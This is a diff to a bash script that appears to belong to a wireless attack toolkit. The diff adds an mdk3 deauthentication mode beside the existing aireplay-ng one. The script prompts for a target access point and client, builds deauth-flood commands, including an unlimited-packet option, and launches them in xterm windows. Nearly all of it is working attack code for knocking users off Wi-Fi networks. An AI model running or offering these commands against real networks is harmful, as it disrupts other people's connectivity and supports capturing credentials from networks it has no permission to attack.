@@ -24,7 +24,7 @@ echo -e "------------------------------"$RS"DEAUTH"$CE"-------------------------
 if [ "$REDEAUTH" = "y" ]
 then
 	export LASTOPTIONS
-	xterm -geometry 90x15+9999+999999 -e bash -c 'aireplay-ng $LASTOPTIONS && exit; exec bash'
+	xterm -geometry 90x15+9999+999999 -e bash -c '$LASTOPTIONS && exit; exec bash'
 	#aireplay-ng $LASTOPTIONS
 else
 	echo -e "Do you want to deauth a specific client?"$YNNO": "	
@@ -40,7 +40,7 @@ else
 		then
 			DEAUTHS=0
 		fi
-		LASTOPTIONS="-0 $DEAUTHS -a $TARGB -c $TCC $WLANNM"
+		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM"
 		export DEAUTHS
 		export TARGB
 		export TCC
@@ -48,18 +48,27 @@ else
 		#aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC wlan0mon
 		#sleep 1h
 	else
-		echo -e "Type the number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
-		read -e DEAUTHS
-		if [ -z $DEAUTHS ]
+		echo -e "Use mkd3 method?"$YNNO":"
+		read -e MKD3YN
+		if [ "$MKD3YN" = "y" ]
 		then
-			DEAUTHS=0
+			echo "$TARGB" > /root/mdk3bssid.txt
+			LASTOPTIONS="mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC"
+			export DEAUTHS
+			export TARGB
+			xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' 
+		else
+			echo -e "Type the number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
+			read -e DEAUTHS
+			if [ -z $DEAUTHS ]
+			then
+				DEAUTHS=0
+			fi
+			LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM"
+			export DEAUTHS
+			export TARGB
+			xterm -geometry 90x15+9999+999999 -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash' 
 		fi
-		LASTOPTIONS="-0 $DEAUTHS -a $TARGB $WLANNM"
-		export DEAUTHS
-		export TARGB
-		xterm -geometry 90x15+9999+999999 -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash' 
-		#aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM
-		#sleep 1h
 	fi
 fi
 clear
@@ -83,7 +92,6 @@ then
 else
 	clear
 	REDEAUTH="y"
-	#aireplay-ng $LASTOPTIONS
 fi
 done
 echo -e "Sure?"$YNNO": "
